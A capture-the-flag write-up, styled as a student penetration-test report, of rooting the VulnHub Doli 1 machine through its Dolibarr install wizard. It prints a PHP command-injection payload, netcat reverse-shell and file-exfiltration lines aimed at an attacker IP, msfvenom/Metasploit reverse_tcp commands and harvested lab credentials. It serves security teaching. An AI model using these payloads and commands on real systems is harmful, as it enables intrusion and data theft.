# 🛡️ Doli 1 — CTF Writeup (VulnHub)

> **VAPT Report | Aadit Patil (K045), Sahasra Ramadugu (K051), Nain Sadarangani (K056)**  
> Report Date: 15 April 2026 | Version: 3.0 (Final)  
> **For Authorized / Educational Use Only**

---

## 🎯 Target Overview

| Field | Details |
|---|---|
| **Machine** | Doli 1 (VulnHub CTF) |
| **Target IP** | 192.168.179.129 |
| **Domain** | doli.thm |
| **Subdomain** | erp.doli.thm |
| **Application** | Dolibarr ERP/CRM (PHP) |
| **Web Server** | nginx 1.10.3 |
| **OS** | Linux Ubuntu |
| **Open Ports** | 22 (SSH), 80 (HTTP) |

---

## ⚠️ Overall Risk Rating

> **🔴 CRITICAL — Full system compromise (root) achieved via chained SQL injection, OS command injection, and local privilege escalation.**

---

## 📊 Findings Summary

| Severity | Count | CVSS | Status |
|---|---|---|---|
| 🔴 Critical | 3 | 9.8 | Exploited |
| 🟠 High | 3 | 7.5–8.1 | Exploited |
| 🟡 Medium | 1 | 5.3 | Identified |
| 🔵 Informational | 1 | N/A | Noted |

---

## 🗺️ Attack Chain — 8 Phases

```
Phase 01 → Reconnaissance        netdiscover → nmap → Nikto → /etc/hosts
Phase 02 → Subdomain Fuzzing     wfuzz → erp.doli.thm discovered
Phase 03 → Web App Exploitation  Dolibarr install wizard → SQLi → RCE (brian.php)
Phase 04 → Reverse Shell         Pentest Monkey PHP payload → Netcat → www-data shell
Phase 05 → Post-Exploitation     Local enum → /opt → ViewMe.png exfiltrated
Phase 06 → Credential Harvesting CyberChef Citrix decode → c3p0:c3p0p4ssw0rd@@
Phase 07 → SSH Login             c3p0 SSH access → LinPEAS enumeration
Phase 08 → Privilege Escalation  msfvenom ELF → Meterpreter → kernel exploit → ROOT
```

---

## 🔍 Detailed Walkthrough

### Phase 01 — Reconnaissance

**Host Discovery**
```bash
netdiscover -r 192.168.179.0/24
# Target found: 192.168.179.129 (VMware)
```

**Port & Service Scan**
```bash
nmap -sC -sV 192.168.179.129
# Port 22: OpenSSH 7.2p2
# Port 80: nginx 1.10.3 | hostname: doli.thm
```

**Web Scan**
```bash
nikto -h http://192.168.179.129
# Limited output; missing security headers, outdated nginx noted
# Pivoted to domain-based enumeration via /etc/hosts
```

---

### Phase 02 — Subdomain Fuzzing

ERP/CRM hint provided by the VM author. Gobuster directory brute-force yielded no results. Mapped IP to `doli.thm` in `/etc/hosts` and fuzed virtual host subdomains.

```bash
wfuzz -c -u "http://doli.thm" -H "Host: FUZZ.doli.thm" \
  -w subdomains-top1million-110000.txt --hw 968
# Result: erp.doli.thm discovered
```

Added `erp.doli.thm` to `/etc/hosts`. Direct access returned `403 Forbidden` — further path enumeration required.

---

### Phase 03 — Web Application Exploitation

**Vulnerability Research**
```bash
searchsploit dolibarr
# Known PHP install wizard exploitation paths identified
```

Enumeration of known Dolibarr paths revealed accessible install scripts including `brian.php`.

**Identified endpoints:**
- `erp.doli.thm/install/step1.php` — Install wizard accessible
- `erp.doli.thm/install/brian.php` — DB configuration form exposed (no auth)

**SQL + OS Command Injection via BurpSuite**

The `db_name` POST parameter was intercepted in BurpSuite and replaced with:

```
db_name: x\';system($_GET[cmd]);//
URL-encoded: x%5C%27%3Bsystem(%24_GET%5Bcmd%5D)%3B%2F%2F
```

No error returned → **RCE confirmed** via GET parameter.

---

### Phase 04 — Reverse Shell

Pentest Monkey PHP reverse shell configured with attacker IP and port `5555`. Payload URL-encoded and delivered via `?cmd=` parameter.

```bash
# Attacker — start listener
sudo nc -nlvp 5555

# Deliver URL-encoded PHP reverse shell via ?cmd= query parameter
# Shell received as: www-data ✓
```

---

### Phase 05 — Post-Exploitation

Local filesystem enumeration:
- `/etc/passwd` reviewed — users identified, home dirs denied
- `/opt` directory explored → `ViewMe.png` and `secrets` file found
- `.bk` directory and access log anomalies identified

```bash
# Exfiltrate ViewMe.png via second Netcat listener
# Attacker: nc -nlvp 4444 > ViewMe.png
# Target:   nc <attacker_ip> 4444 < /opt/ViewMe.png
```

---

### Phase 06 — Credential Harvesting

`ViewMe.png` hinted at **Citrix CTX1 encoding**. An unusual encoded string was found in the web access log. Decoded via **CyberChef → Citrix CTX1**:

| Field | Value |
|---|---|
| **Username** | c3p0 |
| **Password** | c3p0p4ssw0rd@@ |
| **Encoding** | Citrix CTX1 (fully reversible — zero security) |

---

### Phase 07 — SSH Login

```bash
ssh c3p0@192.168.179.129
# Login successful ✓
# note.txt found in home directory with further hints
```

**LinPEAS** uploaded and executed for automated privilege escalation enumeration → kernel escalation vectors identified.

---

### Phase 08 — Privilege Escalation to Root

**Generate Meterpreter payload**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<attacker_ip> LPORT=8888 -f elf -o met.elf
chmod +x met.elf
```

**Metasploit handler**
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <kali_ip>
set LPORT 8888
run
# Meterpreter session opened ✓
```

**Local Exploit Suggester**
```bash
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
# Kernel exploit candidate identified ✓
```

**Root obtained** — Kernel exploit executed → full root-level Meterpreter session. 🎉

```
uid=0(root) gid=0(root) groups=0(root)
```

---

## 🐛 Vulnerabilities

| ID | Severity | CVSS | Title |
|---|---|---|---|
| VULN-01 | 🔴 Critical | 9.8 | Unauthenticated Dolibarr Install Wizard (brian.php) |
| VULN-02 | 🔴 Critical | 9.8 | SQL Injection → OS Command Injection (db_name) |
| VULN-03 | 🔴 Critical | 9.8 | Remote Code Execution via PHP Reverse Shell |
| VULN-04 | 🟠 High | 7.5 | Credentials Stored in Reversibly Encoded Access Log |
| VULN-05 | 🟠 High | 8.1 | SSH Access via Harvested Credentials |
| VULN-06 | 🟠 High | 8.1 | Local Privilege Escalation (Kernel Exploit) |
| VULN-07 | 🟡 Medium | 5.3 | erp.doli.thm Subdomain Publicly Accessible |
| VULN-08 | 🔵 Info | N/A | Outdated Software (nginx 1.10.3, OpenSSH 7.2p2) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `netdiscover` | Subnet host discovery |
| `nmap` | Port/service/OS scanner |
| `Nikto` | Web server vulnerability scanner |
| `wfuzz` | Subdomain/virtual host fuzzer |
| `BurpSuite` | HTTP proxy & request manipulation |
| `Searchsploit` | Offline vulnerability database |
| `Pentest Monkey PHP Reverse Shell` | RCE payload |
| `Netcat (nc)` | TCP listener and file transfer |
| `LinPEAS` | Linux privesc enumeration |
| `msfvenom` | Metasploit payload generator |
| `Metasploit Framework` | Exploitation platform |
| `CyberChef` | Citrix CTX1 decoding |
| `SSH` | Lateral movement |

---

## 📚 References

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [CWE-89 — SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-306 — Missing Authentication](https://cwe.mitre.org/data/definitions/306.html)
- [Dolibarr ERP/CRM](https://www.dolibarr.org/)
- [ExploitDB](https://www.exploit-db.com/)
- [VulnHub — Doli 1](https://www.vulnhub.com/)

---

> **Disclaimer:** This writeup is for educational purposes only. All testing was conducted in an isolated lab environment against an intentionally vulnerable machine. Do not use these techniques against systems you do not own or have explicit authorization to test.
